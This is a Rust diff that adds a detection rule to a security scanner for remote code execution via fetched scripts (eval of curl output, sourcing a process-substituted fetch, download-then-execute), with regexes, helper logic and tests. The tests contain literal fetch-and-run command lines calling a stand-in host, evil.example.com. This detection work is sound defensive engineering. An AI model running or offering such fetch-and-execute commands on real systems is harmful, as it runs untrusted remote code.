@@ -613,6 +613,36 @@ pub(crate) static SENSITIVE_PATTERNS: &[SensitivePattern] = &[
         redact_match: true,
         doc_severity: None,
     },
+    // VTD-0020 — eval of command-substituted fetch (eval "$(curl ...)")
+    SensitivePattern {
+        rule_id: RULE_RCE_PIPE_TO_SHELL,
+        label: "Remote code execution via pipe to shell",
+        severity: Severity::Critical,
+        intent: Intent::Malicious,
+        code_only: true,
+        redact_match: false,
+        doc_severity: None,
+    },
+    // VTD-0020 — source/dot-source of process-substituted fetch (source <(curl ...))
+    SensitivePattern {
+        rule_id: RULE_RCE_PIPE_TO_SHELL,
+        label: "Remote code execution via pipe to shell",
+        severity: Severity::Critical,
+        intent: Intent::Malicious,
+        code_only: true,
+        redact_match: false,
+        doc_severity: None,
+    },
+    // VTD-0020 — download-then-execute (curl -o f URL && bash f)
+    SensitivePattern {
+        rule_id: RULE_RCE_PIPE_TO_SHELL,
+        label: "Remote code execution via pipe to shell",
+        severity: Severity::Critical,
+        intent: Intent::Malicious,
+        code_only: true,
+        redact_match: false,
+        doc_severity: None,
+    },
 ];
 
 // Regex strings indexed parallel to SENSITIVE_PATTERNS (same order, same count).
@@ -745,9 +775,25 @@ static SENSITIVE_PATTERN_STRS: &[&str] = &[
     r#"(?i)(?:Content-Type|content[_-]?type)["']?\s*[:=]\s*["']?application/octet-stream"#,
     // VTD-0027 — shell variable assigned long base64 literal
     r#"\b[A-Za-z_]\w*=["'][A-Za-z0-9+/]{40,}={0,2}["']"#,
+    // VTD-0020 — eval of command-substituted fetch (eval "$(curl ...)")
+    r#"(?i)\beval\s+["']?\$\(\s*(?:curl|wget)\s"#,
+    // VTD-0020 — source/dot-source of process-substituted fetch (source <(curl ...))
+    r#"(?i)(?:\bsource\s+|\B\.\s+)<\(\s*(?:curl|wget)\s"#,
+    // VTD-0020 — download-then-execute: only the download half is here;
+    // `executes_downloaded_file` decides whether the downloaded file runs.
+    DOWNLOAD_THEN_EXEC_STR,
 ];
 
 static SENSITIVE_REGEXES: OnceLock<Vec<Regex>> = OnceLock::new();
+
+// VTD-0020 — download-then-execute (curl -o f URL && bash f). The regex
+// proves a download with an output flag (`-o`, a combined short-flag cluster
+// ending in `o`/`O` like `-fsSLo f`, `--output f`, `--output=f`) and a
+// following command; whether that command executes the downloaded file is
+// `executes_downloaded_file`'s job, so a download-only line, a discarded
+// download or a different executed file cannot fire.
+const DOWNLOAD_THEN_EXEC_STR: &str =
+    r#"(?i)\b(?:curl|wget)\s[^;\n|&]*(?:--output|-[A-Za-z]*[oO])(?:\s+|=)\S+[^;\n|&]*(?:&&|;)"#;
 
 pub(crate) fn get_sensitive_regexes() -> &'static [Regex] {
     SENSITIVE_REGEXES.get_or_init(|| {
@@ -847,6 +893,94 @@ fn keep_best(
 /// # Returns
 /// A [`SensitiveScan`]; `secrets_check_failed` is `true` if any critical or
 /// high-severity finding was produced.
+/// Index of the download-then-execute pattern in `SENSITIVE_PATTERN_STRS`.
+fn download_then_exec_index() -> usize {
+    static IDX: OnceLock<usize> = OnceLock::new();
+    *IDX.get_or_init(|| {
+        SENSITIVE_PATTERN_STRS
+            .iter()
+            .position(|s| *s == DOWNLOAD_THEN_EXEC_STR)
+            .expect("download-then-exec pattern present in SENSITIVE_PATTERN_STRS")
+    })
+}
+
+/// The path the `curl`/`wget` in `segment` writes with its output flag:
+/// `-o f`, a combined short-flag cluster ending in `o`/`O` (`-fsSLo f`),
+/// `--output f` or `--output=f`. `None` when the flag's operand is the URL
+/// (a bare `curl -O URL`) or the segment has no output flag.
+fn downloaded_path(segment: &str) -> Option<&str> {
+    if !segment.contains("curl") && !segment.contains("wget") {
+        return None;
+    }
+    let tokens: Vec<&str> = segment.split_whitespace().collect();
+    for (i, token) in tokens.iter().enumerate() {
+        let operand = if *token == "--output" || *token == "-o" {
+            tokens.get(i + 1).copied()
+        } else if let Some(rest) = token.strip_prefix("--output=") {
+            Some(rest)
+        } else if token.len() > 1
+            && token.starts_with('-')
+            && !token.starts_with("--")
+            && token[1..].chars().all(|c| c.is_ascii_alphabetic())
+            && matches!(token.chars().last(), Some('o' | 'O'))
+        {
+            tokens.get(i + 1).copied()
+        } else {
+            continue;
+        };
+        let operand = operand?;
+        if operand.starts_with("http://") || operand.starts_with("https://") {
+            return None;
+        }
+        return Some(operand.trim_matches('"').trim_matches('\''));
+    }
+    None
+}
+
+/// True when a later command segment of `line` executes the file the
+/// download writes: an interpreter invocation (`sudo bash f`, `python f`,
+/// `node f`) or `./f`, with quotes and a leading `./` ignored. `/dev/null`
+/// and a different file never count — the rule fires only when the bytes
+/// that were downloaded are the bytes that run.
+fn executes_downloaded_file(line: &str) -> bool {
+    let segments: Vec<&str> = line.split("&&").flat_map(|s| s.split(';')).collect();
+    let Some((download_idx, path)) = segments
+        .iter()
+        .enumerate()
+        .find_map(|(i, segment)| downloaded_path(segment).map(|p| (i, p)))
+    else {
+        return false;
+    };
+    if path == "/dev/null" {
+        return false;
+    }
+    segments.iter().skip(download_idx + 1).any(|segment| {
+        let tokens: Vec<&str> = segment.split_whitespace().collect();
+        for (i, token) in tokens.iter().enumerate() {
+            let token = token.trim_matches('"').trim_matches('\'');
+            // `./f` — direct execution of the downloaded file.
+            if token.strip_prefix("./").is_some_and(|c| c == path) {
+                return true;
+            }
+            // `sudo bash f`, `python f` — an interpreter running the file.
+            if matches!(
+                token.to_ascii_lowercase().as_str(),
+                "bash" | "sh" | "zsh" | "dash" | "ksh" | "python" | "python3" | "node"
+            ) {
+                for candidate in tokens.iter().skip(i + 1) {
+                    let candidate = candidate.trim_matches('"').trim_matches('\'');
+                    if candidate.starts_with('-') {
+                        continue; // an interpreter flag, not the file
+                    }
+                    let candidate = candidate.strip_prefix("./").unwrap_or(candidate);
+                    return candidate == path;
+                }
+            }
+        }
+        false
+    })
+}
+
 pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> SensitiveScan {
     let mut scan = SensitiveScan {
         findings: Vec::new(),
@@ -884,6 +1018,10 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
                 pat.severity.clone()
             };
             let re = &regexes[i_pat];
+            // The download-then-execute pattern proves only a download with
+            // a following command; the line is a finding only when that
+            // command executes the downloaded file.
+            let download_exec = i_pat == download_then_exec_index();
             let mut best: Option<(Severity, usize, usize, bool)> = None;
             // C25: the fetch and decode rules are flow-sensitive, and the
             // assessment must happen per occurrence *before* the best is
@@ -895,6 +1033,9 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
             );
 
             for (i_line, line) in lines.iter().enumerate() {
+                if download_exec && !executes_downloaded_file(line) {
+                    continue;
+                }
                 // Keep the strongest match on the line; a lower-severity
                 // pattern for the same rule must not hide a later match.
                 let mut direct_found = false;
@@ -1509,7 +1650,97 @@ mod tests {
             r#"PAYLOAD="QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==""#,
             "VTD-0027",
         ),
+        // VTD-0020 (eval of command-substituted fetch)
+        (r#"eval "$(curl http://evil.example.com/x.sh)""#, "VTD-0020"),
+        // VTD-0020 (source of process-substituted fetch)
+        (r#"source <(curl http://evil.example.com/x.sh)"#, "VTD-0020"),
+        // VTD-0020 (dot-source of process-substituted fetch)
+        (". <(curl http://evil.example.com/x.sh)", "VTD-0020"),
+        // VTD-0020 (curl download-then-execute)
+        (
+            "curl -o /tmp/x.sh http://evil.example.com/x.sh && bash /tmp/x.sh",
+            "VTD-0020",
+        ),
+        // VTD-0020 (wget download-then-execute)
+        (
+            "wget -O /tmp/x.sh http://evil.example.com/x.sh; sh /tmp/x.sh",
+            "VTD-0020",
+        ),
     ];
+
+    // Near-miss shapes for the literal remote-execution patterns: fetches that
+    // never reach an interpreter must not fire the pipe-to-shell rule.
+    #[test]
+    fn literal_remote_exec_near_misses_do_not_fire() {
+        let near_misses: &[&str] = &[
+            // download with no later execution
+            "curl -o /tmp/data.txt http://x.example.com/data.txt",
+            // eval of a non-fetched string
+            r#"eval "echo hi""#,
+            // source of a local file, not a fetch
+            "source ./config.sh",
+            // eval of a shell variable is VTD-0023's job, not pipe-to-shell
+            r#"eval "$PAYLOAD""#,
+        ];
+        for &content in near_misses {
+            let tf = files(&[("scripts/x.sh", content)]);
+            let findings = scan_sensitive_patterns(&tf).findings;
+            assert!(
+                !findings.iter().any(|f| f.rule_id == RULE_RCE_PIPE_TO_SHELL),
+                "pipe-to-shell fired on near-miss: {content:?}"
+            );
+        }
+    }
+
+    // Round 3 review: the download-then-execute shape fires only when the
+    // executed file is the downloaded one.
+    #[test]
+    fn download_to_dev_null_then_local_script_does_not_fire() {
+        // A health-check download to /dev/null discards the bytes; the
+        // script that runs is a local file, not the download.
+        let content = "curl -s -o /dev/null http://localhost:3000/health && bash scripts/start.sh";
+        let tf = files(&[("scripts/x.sh", content)]);
+        let findings = scan_sensitive_patterns(&tf).findings;
+        assert!(
+            !findings.iter().any(|f| f.rule_id == RULE_RCE_PIPE_TO_SHELL),
+            "a discarded download is not execution: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn download_then_exec_covers_combined_flags_and_interpreters() {
+        // Combined short flags (`-fsSLo f`), intervening commands
+        // (`chmod +x f`), and `python`/`node` execution all fire like the
+        // pipe pattern.
+        let contents = [
+            "curl -fsSLo install.sh http://evil.example.com/x.sh && bash install.sh",
+            "curl -o i.sh http://evil.example.com/x.sh && chmod +x i.sh && ./i.sh",
+            "curl -o f.py http://evil.example.com/x.py && python f.py",
+            "curl -o f.js http://evil.example.com/x.js && node f.js",
+            "wget --output=setup.sh http://evil.example.com/x.sh && sudo bash setup.sh",
+        ];
+        for content in contents {
+            let tf = files(&[("scripts/x.sh", content)]);
+            let findings = scan_sensitive_patterns(&tf).findings;
+            assert!(
+                findings.iter().any(|f| f.rule_id == RULE_RCE_PIPE_TO_SHELL),
+                "download-then-exec did not fire for: {content:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn download_then_exec_of_a_different_file_does_not_fire() {
+        // Executing a different file than the one downloaded is not
+        // running remote bytes: the rule must not fire.
+        let content = "curl -o a.sh http://evil.example.com/x.sh && bash b.sh";
+        let tf = files(&[("scripts/x.sh", content)]);
+        let findings = scan_sensitive_patterns(&tf).findings;
+        assert!(
+            !findings.iter().any(|f| f.rule_id == RULE_RCE_PIPE_TO_SHELL),
+            "a different executed file must not fire: {findings:?}"
+        );
+    }
 
     #[test]
     fn every_sensitive_pattern_rule_fires() {
